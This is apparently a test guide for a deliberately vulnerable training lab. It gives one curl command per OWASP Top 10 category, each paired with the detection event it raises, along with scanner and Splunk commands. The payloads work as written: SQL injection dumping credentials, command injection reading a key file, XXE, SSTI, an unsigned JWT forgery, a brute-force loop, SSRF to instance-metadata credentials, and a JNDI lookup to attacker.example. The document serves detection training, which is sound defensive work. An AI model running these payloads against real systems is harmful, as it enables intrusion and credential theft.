# OWASP Top 10 test commands

One command per OWASP Top 10 2021 category against the Meridian Freight Solutions
target, with the detection event each one produces. These are *smoke tests* — run
them to prove the range and the SIEM pipeline work. For the full walkthroughs
with the recovered data, MITRE mapping and remediation, see
[`ASSESSMENT_PLAYBOOK.md`](ASSESSMENT_PLAYBOOK.md); for a staged intrusion see
[`ATTACK_SIMULATION.md`](ATTACK_SIMULATION.md).

Run them only against an isolated lab host.

```bash
export TARGET="http://127.0.0.1:5005"        # or http://iis-lab.internal:8080
curl -fsS "$TARGET/health"
```

Tag a run so you can isolate it in Splunk:

```bash
export TAG='X-Lab-Test-ID: smoke-run-1'
```

Proof of exploitation is a `MERIDIAN{...}` value inside recovered data, never a
field named `flag`.

## A01 — Broken Access Control

```bash
# IDOR: another customer's consignment (no auth, no ownership check)
curl -sS -H "$TAG" "$TARGET/api/v1/shipments/MFS-2026-4471"
# Path traversal: application secrets outside the document root
curl -sS -H "$TAG" --get --data-urlencode 'document=../instance/app-secrets.ini' \
  "$TARGET/api/v1/invoices/download"
```

Events: `broken_access_attempt allowed=true`, `path_traversal_attempt`.
Use cases: UC-04, UC-08. Findings: `idor-shipment`, `traversal-invoice`.

## A02 — Cryptographic Failures

```bash
# Forged staff session signed with the default key (finding weak-session-secret)
FORGED=$(python3 tools/forge_session.py --secret meridian-default-signing-key)
curl -sS -H "$TAG" -H "Cookie: session=$FORGED" "$TARGET/admin"
# Predictable reset token = md5(username) (finding reset-token)
curl -sS -H "$TAG" "$TARGET/portal/reset"
```

Events: `forged_session_detected`, `admin_panel_access granted=true`.
Use cases: UC-14, UC-15. Findings: `weak-session-secret`, `reset-token`.

## A03 — Injection

```bash
# SQL injection (rate lookup) and auth bypass (legacy login)
curl -sS -H "$TAG" --get \
  --data-urlencode "q=' UNION SELECT id,partner,api_key FROM integration_credentials-- " \
  "$TARGET/api/v1/rates/search"
# Reflected XSS (site search)
curl -sS -H "$TAG" --get --data-urlencode 'q=<script>alert(1)</script>' "$TARGET/search"
# Command injection (staff depot check) - needs a staff session cookie
curl -sS -H "$TAG" -H "Cookie: session=$FORGED" -H 'Content-Type: application/json' \
  -X POST "$TARGET/admin/diagnostics" \
  -d '{"host":"127.0.0.1; cat instance/keys/depot-transfer.key"}'
# SSTI (campaign preview)
curl -sS -H "$TAG" -H "Cookie: session=$FORGED" --get --data-urlencode 'body={{7*7}}' \
  "$TARGET/admin/campaigns/preview"
```

Events: `sql_query suspicious=true`, `xss_probe`, `command_injection_attempt`
plus `command_execution`, `ssti_attempt`.
Use cases: UC-06, UC-07, UC-09, UC-10.

`command_execution` is the highest-fidelity event the range produces — if only
one detection gets built from this lab, build that one.

## A04 — Insecure Design

```bash
# Negative quantity issues a credit note (finding logic-negative-quote)
curl -sS -H "$TAG" -X POST "$TARGET/services/quote" -H 'Content-Type: application/json' \
  -d '{"weight_kg":-1200,"rate_per_kg":0.42}'
# Unrestricted upload lands in a browsable store (finding upload-unrestricted)
printf 'test' > /tmp/cv.php
curl -sS -H "$TAG" -X POST "$TARGET/careers/apply" -F 'cv=@/tmp/cv.php'
```

Events: `business_logic_abuse negative_total=true`, `dangerous_upload`.
Use cases: UC-17, UC-12.

## A05 — Security Misconfiguration

```bash
curl -sS -H "$TAG" "$TARGET/status/diagnostics"      # dev status page
curl -sS -H "$TAG" "$TARGET/.env"                    # env file in the web root
curl -sS -H "$TAG" "$TARGET/backups/"                # autoindexed export dir
# XXE via the supplier EDI import
curl -sS -H "$TAG" -X POST "$TARGET/api/v1/edi/manifest" -H 'Content-Type: application/xml' \
  --data-binary '<?xml version="1.0"?><!DOCTYPE m [<!ENTITY e SYSTEM "file:///etc/hostname">]><m>&e;</m>'
```

Events: `debug_endpoint_access`, `sensitive_file_access`,
`directory_listing_access`, `xxe_attempt`.
Use cases: UC-03, UC-02, UC-11.

## A06 — Vulnerable and Outdated Components

```bash
curl -sS -H "$TAG" "$TARGET/status/diagnostics" | grep -o 'log4j-core[^,]*'
# Log4Shell-class lookup in a logged header (finding jndi-audit)
curl -sS -H "$TAG" -H 'X-Tracking-Agent: ${jndi:ldap://attacker.example/a}' \
  "$TARGET/api/v1/audit/event"
```

Events: `outdated_component_inventory`, `jndi_lookup_detected`.
Use case: UC-18.

The component versions are simulated, not installed, and the JNDI lookup is
recorded without ever being resolved. No outbound LDAP request is made.

## A07 — Identification and Authentication Failures

```bash
# No lockout: brute the service account (svc_edi / autumn2024)
for p in Autumn2023 autumn2023 Password1 summer2024 autumn2024; do
  curl -sS -H "$TAG" -X POST "$TARGET/portal/login" -H 'Content-Type: application/json' \
    -d "{\"username\":\"svc_edi\",\"password\":\"$p\"}"
done
# Unsigned partner token (alg:none) reaching the financial report
b64() { printf '%s' "$1" | base64 | tr -d '=\n' | tr '/+' '_-'; }
TOKEN="$(b64 '{"alg":"none","typ":"JWT"}').$(b64 '{"sub":"harborline","role":"finance"}')."
curl -sS -H "$TAG" -H "Authorization: Bearer $TOKEN" "$TARGET/api/v1/reports/financial"
```

Events: repeated `authentication_attempt`, then `brute_force_suspected`, then a
success; and `jwt_unsigned_accepted`.
Use cases: UC-13, UC-14. The failure-then-success sequence is the alert that matters.

## A08 — Software and Data Integrity Failures

```bash
# Mass assignment: set account_type from the profile form (finding access-massassign)
curl -sS -H "$TAG" -X POST "$TARGET/portal/profile" -H 'Content-Type: application/json' \
  -d '{"contact_name":"Dana","account_type":"operations"}'
```

Event: `privilege_change mechanism=mass_assignment`.
Use case: UC-05.

## A09 — Security Logging and Monitoring Failures

The `monitoring_gap_simulated` teaching event (UC-19) fires on an action logged
without actor or destination. Every finding also emits `artifact_disclosed`
(UC-22) when real data leaves — the event a SOC should alert on:

```bash
curl -sS -H "$TAG" "$TARGET/api/v1/shipments/MFS-2026-4471" >/dev/null
jq -r 'select(.test_id=="smoke-run-1" and .event_type=="artifact_disclosed")
  | "\(.finding_title): \(.proof_artifact)"' logs/meridian-events.jsonl
```

## A10 — Server-Side Request Forgery

```bash
# Link preview fetches an internal URL (finding ssrf-metadata) - staff session
curl -sS -H "$TAG" -H "Cookie: session=$FORGED" --get --data-urlencode \
  'url=http://metadata:8080/latest/meta-data/iam/security-credentials/mfs-web-instance-role' \
  "$TARGET/admin/integrations/preview"
```

Event: `ssrf_probe`. Use case: UC-16.

Egress is bounded to an allow-list of lab-internal hosts, so this cannot reach
your corporate network. Outside Docker the metadata service is on
`http://127.0.0.1:8080`.

## Confirm everything landed

```bash
jq -r 'select(.test_id=="smoke-run-1") | .event_type' logs/meridian-events.jsonl | sort | uniq -c
```

```spl
index=vapt_lab sourcetype=helpag:owasp:json test_id="smoke-run-1"
| stats count by event_type severity
| sort - count
```

## Scanner commands

```bash
nuclei -u "$TARGET" -severity low,medium,high,critical -jsonl -o nuclei.jsonl
katana -u "$TARGET" -jc -d 3 -o katana-urls.txt
httpx -u "$TARGET" -status-code -title -tech-detect
ffuf -u "$TARGET/FUZZ" -w wordlists/meridian-paths.txt -mc all -of json -o ffuf.json
gobuster dir -u "$TARGET" -w wordlists/meridian-paths.txt -o gobuster.txt
sqlmap -u "$TARGET/api/v1/rates/search?q=test" -p q --batch --dbms=sqlite \
       --dump -T integration_credentials
```

Run a scanner and the staged simulation back to back, then compare what your
alerts produced for each. Section 8 of [`ATTACK_SIMULATION.md`](ATTACK_SIMULATION.md)
explains why that comparison is the most useful tuning exercise on this range.

## Full automated run

```bash
./tools/validate_range.sh "$TARGET"      # recovers all 22 artifacts
./tools/simulate_attack.sh "$TARGET"     # staged intrusion, one source, SIEM-paced
```
